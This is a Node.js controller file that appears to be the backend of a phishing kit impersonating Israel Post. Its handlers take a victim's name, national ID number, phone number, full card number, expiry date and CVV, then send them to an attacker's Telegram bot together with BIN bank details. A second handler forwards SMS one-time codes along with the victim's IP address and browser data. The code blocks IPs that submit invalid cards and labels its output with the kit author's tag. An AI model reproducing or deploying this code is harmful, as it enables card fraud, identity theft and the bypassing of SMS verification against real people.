const { telegramService } = require("../services");
const getUserAgent = require("../utils/getUserAgent");
const { default: axios } = require("axios");
const isValidCreditCard = require("../utils/isValidCreditCard");
const formatCreditCard = require("../utils/formatCreditCard");
const BlockedIP = require("../models/blockedIP.model");

module.exports.addCardDetails = async (req, res, next) => {
  try {
    const { fullName, idNumber, phoneNumber, cardNumber, expiry, cvv } =
      req.body;

    const isValidCard = isValidCreditCard(cardNumber, cvv, expiry);

    if (!isValidCard) {
      const blockedIP = new BlockedIP({ ip: req.connection.remoteAddress });
      await blockedIP.save();
      return res.status(200).json({ success: false });
    }

    const bin = cardNumber.replace(/\D/g, "").substring(0, 7);
    const url = `https://lookup.binlist.net/${bin}`;
    const response = await axios.get(url);
    const cardDetails = response.data;

    const line1 = "[IsraelPost - 💳 Card Info 💳]";
    const line2 = `[👤] Full Name: ${fullName}`;
    const line3 = `[👤] ID Number: ${idNumber}`;
    const line4 = `[👤] Mobile Number: ${phoneNumber}`;
    const line5 = `[💳] Card Number: ${formatCreditCard(cardNumber)}`;
    const line6 = `[🔄] Expiry Date: ${expiry}`;
    const line7 = `[🔑] CCV: ${cvv}`;
    const line8 = `[🔍] GEO IP: ${req.connection.remoteAddress}`;
    const line9 = "\n";
    const line10 = "[IsraelPost - 💳 BIN Info 💳]";
    const line11 = `[🏛] Card Bank:  ${cardDetails?.bank?.name || "Unknown"}`;
    const line12 = `[💳] Card Type: ${cardDetails.scheme.toUpperCase()} ${cardDetails.type.toUpperCase()}`;
    const line13 = `[💳] Card Brand: ${
      cardDetails?.brand?.toUpperCase?.() || "Unknown"
    }`;
    const line14 = `[💳] Prepaid: ${cardDetails.prepaid ? "Yes" : "No"}`;
    const line15 = `[💳] Currency: ${
      cardDetails?.country?.currency || "Unknown"
    }`;
    const line16 = `[IsraelPost BY: GHOST !#MSD!#]`;

    const message = `${line1}\n${line2}\n${line3}\n${line4}\n${line5}\n${line6}\n${line7}\n${line8}\n${line9}\n${line10}\n${line11}\n${line12}\n${line13}\n${line14}\n${line15}\n${line16}`;

    telegramService.sendMessage(message);

    res.status(200).json({ success: true });
  } catch (err) {
    console.log("ERR", err);
    res.status(200).json({ success: false });
  }
};

module.exports.addCardOTP = async (req, res, next) => {
  try {
    const { otp } = req.body;

    const { osName, browser, ua } = getUserAgent(req);

    const message = `
    [=====>  ISRAELPOST: GHOST $ MSD  SMS    <=====]
    [ SMS CODE: ${otp}
    [ IP: ${req.connection.remoteAddress}
    [ OS: ${osName || "Unknown"}
    [ Browser: ${browser?.name || "None"}
    [ UA: ${ua}
    [=====>  ISRAELPOST: GHOST $ MSD  SMS   <=====]
    `;

    if (otp) {
      telegramService.sendMessage(message);
    }

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(200).json({ success: false });
  }
};
